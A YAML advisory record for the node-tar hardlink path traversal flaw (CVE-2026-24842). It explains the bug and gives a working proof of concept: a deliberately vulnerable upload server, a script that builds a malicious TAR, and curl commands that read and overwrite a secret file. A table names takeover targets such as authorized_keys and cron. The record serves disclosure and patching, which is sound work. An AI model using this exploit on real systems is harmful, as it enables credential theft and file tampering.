@@ -1,0 +1,367 @@
+advisory_id: GHSA-34x7-hfp2-rc4v
+datasource_id: github_osv/GHSA-34x7-hfp2-rc4v
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-34x7-hfp2-rc4v/GHSA-34x7-hfp2-rc4v.json
+aliases:
+  - CVE-2026-24842
+summary: |
+  node-tar Vulnerable to Arbitrary File Creation/Overwrite via Hardlink Path Traversal
+  ### Summary
+  node-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.
+
+  ### Details
+  The vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:
+
+  **Security check in `[STRIPABSOLUTEPATH]`:**
+  ```javascript
+  const entryDir = path.posix.dirname(entry.path);
+  const resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));
+  if (resolved.startsWith('../')) { /* block */ }
+  ```
+
+  **Hardlink creation in `[HARDLINK]`:**
+  ```javascript
+  const linkpath = path.resolve(this.cwd, entry.linkpath);
+  fs.linkSync(linkpath, dest);
+  ```
+
+  **Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.
+
+  - **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.
+
+  - **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.
+
+  The security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.
+
+  ### PoC
+  #### Setup
+
+  Create a new directory with these files:
+
+  ```
+  poc/
+  ├── package.json
+  ├── secret.txt          ← sensitive file (target)
+  ├── server.js           ← vulnerable server
+  ├── create-malicious-tar.js
+  ├── verify.js
+  └── uploads/            ← created automatically by server.js
+      └── (extracted files go here)
+  ```
+
+  **package.json**
+  ```json
+  { "dependencies": { "tar": "^7.5.0" } }
+  ```
+
+  **secret.txt** (sensitive file outside uploads/)
+  ```
+  DATABASE_PASSWORD=supersecret123
+  ```
+
+  **server.js** (vulnerable file upload server)
+  ```javascript
+  const http = require('http');
+  const fs = require('fs');
+  const path = require('path');
+  const tar = require('tar');
+
+  const PORT = 3000;
+  const UPLOAD_DIR = path.join(__dirname, 'uploads');
+  fs.mkdirSync(UPLOAD_DIR, { recursive: true });
+
+  http.createServer((req, res) => {
+    if (req.method === 'POST' && req.url === '/upload') {
+      const chunks = [];
+      req.on('data', c => chunks.push(c));
+      req.on('end', async () => {
+        fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));
+        await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });
+        res.end('Extracted\n');
+      });
+    } else if (req.method === 'GET' && req.url === '/read') {
+      // Simulates app serving extracted files (e.g., file download, static assets)
+      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
+      if (fs.existsSync(targetPath)) {
+        res.end(fs.readFileSync(targetPath));
+      } else {
+        res.end('File not found\n');
+      }
+    } else if (req.method === 'POST' && req.url === '/write') {
+      // Simulates app writing to extracted file (e.g., config update, log append)
+      const chunks = [];
+      req.on('data', c => chunks.push(c));
+      req.on('end', () => {
+        const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
+        if (fs.existsSync(targetPath)) {
+          fs.writeFileSync(targetPath, Buffer.concat(chunks));
+          res.end('Written\n');
+        } else {
+          res.end('File not found\n');
+        }
+      });
+    } else {
+      res.end('POST /upload, GET /read, or POST /write\n');
+    }
+  }).listen(PORT, () => console.log(`http://localhost:${PORT}`));
+  ```
+
+  **create-malicious-tar.js** (attacker creates exploit TAR)
+  ```javascript
+  const fs = require('fs');
+
+  function tarHeader(name, type, linkpath = '', size = 0) {
+    const b = Buffer.alloc(512, 0);
+    b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);
+    b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);
+    b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);
+    b.write('        ', 148);
+    b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;
+    if (linkpath) b.write(linkpath, 157);
+    b.write('ustar\x00', 257); b.write('00', 263);
+    let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];
+    b.write(sum.toString(8).padStart(6, '0') + '\x00 ', 148);
+    return b;
+  }
+
+  // Hardlink escapes to parent directory's secret.txt
+  fs.writeFileSync('malicious.tar', Buffer.concat([
+    tarHeader('d/', 'dir'),
+    tarHeader('d/x', 'link', '../secret.txt'),
+    Buffer.alloc(1024)
+  ]));
+  console.log('Created malicious.tar');
+  ```
+
+  #### Run
+
+  ```bash
+  # Setup
+  npm install
+  echo "DATABASE_PASSWORD=supersecret123" > secret.txt
+
+  # Terminal 1: Start server
+  node server.js
+
+  # Terminal 2: Execute attack
+  node create-malicious-tar.js
+  curl -X POST --data-binary @malicious.tar http://localhost:3000/upload
+
+  # READ ATTACK: Steal secret.txt content via the hardlink
+  curl http://localhost:3000/read
+  # Returns: DATABASE_PASSWORD=supersecret123
+
+  # WRITE ATTACK: Overwrite secret.txt through the hardlink
+  curl -X POST -d "PWNED" http://localhost:3000/write
+
+  # Confirm secret.txt was modified
+  cat secret.txt
+  ```
+  ### Impact
+
+  An attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:
+
+  **Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.
+
+  **Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.
+
+  ### Remote Code Execution / Server Takeover
+
+  | Attack Vector | Target File | Result |
+  |--------------|-------------|--------|
+  | SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |
+  | Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |
+  | Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |
+  | Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |
+  | Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |
+  | User Creation | `/etc/passwd` (if running as root) | Add new privileged user |
+
+  ## Data Exfiltration & Corruption
+
+  1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations
+  2. **Read sensitive files** by creating hardlinks that point outside extraction directory
+  3. **Corrupt databases** and application state
+  4. **Steal credentials** from config files, `.env`, secrets
+impacted_packages:
+  - purl: pkg:github/isaacs/node-tar
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/isaacs/node-tar
+        commit: f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:npm/tar
+    affected_versions: vers:npm/<7.5.7
+    fixed_versions: vers:npm/7.5.7
+    affected_packages:
+      - pkg:npm/tar@0.0.1
+      - pkg:npm/tar@0.1.0
+      - pkg:npm/tar@0.1.2
+      - pkg:npm/tar@0.1.3
+      - pkg:npm/tar@0.1.4
+      - pkg:npm/tar@0.1.5
+      - pkg:npm/tar@0.1.6
+      - pkg:npm/tar@0.1.7
+      - pkg:npm/tar@0.1.8
+      - pkg:npm/tar@0.1.9
+      - pkg:npm/tar@0.1.10
+      - pkg:npm/tar@0.1.11
+      - pkg:npm/tar@0.1.12
+      - pkg:npm/tar@0.1.13
+      - pkg:npm/tar@0.1.14
+      - pkg:npm/tar@0.1.15
+      - pkg:npm/tar@0.1.16
+      - pkg:npm/tar@0.1.17
+      - pkg:npm/tar@0.1.18
+      - pkg:npm/tar@0.1.19
+      - pkg:npm/tar@0.1.20
+      - pkg:npm/tar@1.0.0
+      - pkg:npm/tar@1.0.1
+      - pkg:npm/tar@1.0.2
+      - pkg:npm/tar@1.0.3
+      - pkg:npm/tar@2.0.0
+      - pkg:npm/tar@2.0.1
+      - pkg:npm/tar@2.1.0
+      - pkg:npm/tar@2.1.1
+      - pkg:npm/tar@2.2.0
+      - pkg:npm/tar@2.2.1
+      - pkg:npm/tar@2.2.2
+      - pkg:npm/tar@3.0.0
+      - pkg:npm/tar@3.0.1
+      - pkg:npm/tar@3.1.0
+      - pkg:npm/tar@3.1.1
+      - pkg:npm/tar@3.1.2
+      - pkg:npm/tar@3.1.3
+      - pkg:npm/tar@3.1.4
+      - pkg:npm/tar@3.1.5
+      - pkg:npm/tar@3.1.6
+      - pkg:npm/tar@3.1.7
+      - pkg:npm/tar@3.1.8
+      - pkg:npm/tar@3.1.9
+      - pkg:npm/tar@3.1.10
+      - pkg:npm/tar@3.1.11
+      - pkg:npm/tar@3.1.12
+      - pkg:npm/tar@3.1.13
+      - pkg:npm/tar@3.1.14
+      - pkg:npm/tar@3.1.15
+      - pkg:npm/tar@3.2.0
+      - pkg:npm/tar@3.2.1
+      - pkg:npm/tar@3.2.2
+      - pkg:npm/tar@3.2.3
+      - pkg:npm/tar@4.0.0
+      - pkg:npm/tar@4.0.1
+      - pkg:npm/tar@4.0.2
+      - pkg:npm/tar@4.1.0
+      - pkg:npm/tar@4.1.1
+      - pkg:npm/tar@4.1.2
+      - pkg:npm/tar@4.2.0
+      - pkg:npm/tar@4.3.0
+      - pkg:npm/tar@4.3.1
+      - pkg:npm/tar@4.3.2
+      - pkg:npm/tar@4.3.3
+      - pkg:npm/tar@4.4.0
+      - pkg:npm/tar@4.4.1
+      - pkg:npm/tar@4.4.2
+      - pkg:npm/tar@4.4.3
+      - pkg:npm/tar@4.4.4
+      - pkg:npm/tar@4.4.5
+      - pkg:npm/tar@4.4.6
+      - pkg:npm/tar@4.4.7
+      - pkg:npm/tar@4.4.8
+      - pkg:npm/tar@4.4.9
+      - pkg:npm/tar@4.4.10
+      - pkg:npm/tar@4.4.11
+      - pkg:npm/tar@4.4.12
+      - pkg:npm/tar@4.4.13
+      - pkg:npm/tar@4.4.14
+      - pkg:npm/tar@4.4.15
+      - pkg:npm/tar@4.4.16
+      - pkg:npm/tar@4.4.17
+      - pkg:npm/tar@4.4.18
+      - pkg:npm/tar@4.4.19
+      - pkg:npm/tar@5.0.0
+      - pkg:npm/tar@5.0.1
+      - pkg:npm/tar@5.0.2
+      - pkg:npm/tar@5.0.4
+      - pkg:npm/tar@5.0.5
+      - pkg:npm/tar@5.0.6
+      - pkg:npm/tar@5.0.7
+      - pkg:npm/tar@5.0.8
+      - pkg:npm/tar@5.0.9
+      - pkg:npm/tar@5.0.10
+      - pkg:npm/tar@5.0.11
+      - pkg:npm/tar@6.0.0
+      - pkg:npm/tar@6.0.1
+      - pkg:npm/tar@6.0.2
+      - pkg:npm/tar@6.0.3
+      - pkg:npm/tar@6.0.4
+      - pkg:npm/tar@6.0.5
+      - pkg:npm/tar@6.1.0
+      - pkg:npm/tar@6.1.1
+      - pkg:npm/tar@6.1.2
+      - pkg:npm/tar@6.1.3
+      - pkg:npm/tar@6.1.4
+      - pkg:npm/tar@6.1.5
+      - pkg:npm/tar@6.1.6
+      - pkg:npm/tar@6.1.7
+      - pkg:npm/tar@6.1.8
+      - pkg:npm/tar@6.1.9
+      - pkg:npm/tar@6.1.10
+      - pkg:npm/tar@6.1.11
+      - pkg:npm/tar@6.1.12
+      - pkg:npm/tar@6.1.13
+      - pkg:npm/tar@6.1.14
+      - pkg:npm/tar@6.1.15
+      - pkg:npm/tar@6.2.0
+      - pkg:npm/tar@6.2.1
+      - pkg:npm/tar@7.0.0
+      - pkg:npm/tar@7.0.1
+      - pkg:npm/tar@7.1.0
+      - pkg:npm/tar@7.2.0
+      - pkg:npm/tar@7.3.0
+      - pkg:npm/tar@7.4.0
+      - pkg:npm/tar@7.4.1
+      - pkg:npm/tar@7.4.2
+      - pkg:npm/tar@7.4.3
+      - pkg:npm/tar@7.4.4
+      - pkg:npm/tar@7.5.0
+      - pkg:npm/tar@7.5.1
+      - pkg:npm/tar@7.5.2
+      - pkg:npm/tar@7.5.3
+      - pkg:npm/tar@7.5.4
+      - pkg:npm/tar@7.5.5
+      - pkg:npm/tar@7.5.6
+    fixed_packages:
+      - pkg:npm/tar@7.5.7
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '8.2'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-34x7-hfp2-rc4v/GHSA-34x7-hfp2-rc4v.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-22
+  - CWE-59
+references:
+  - url: https://github.com/isaacs/node-tar
+    reference_type:
+    reference_id:
+  - url: https://github.com/isaacs/node-tar/commit/f4a7aa9bc3d717c987fdf1480ff7a64e87ffdb46
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-24842
+    reference_type:
+    reference_id: CVE-2026-24842
+  - url: https://github.com/isaacs/node-tar/security/advisories/GHSA-34x7-hfp2-rc4v
+    reference_type:
+    reference_id: GHSA-34x7-hfp2-rc4v
+exploits: []
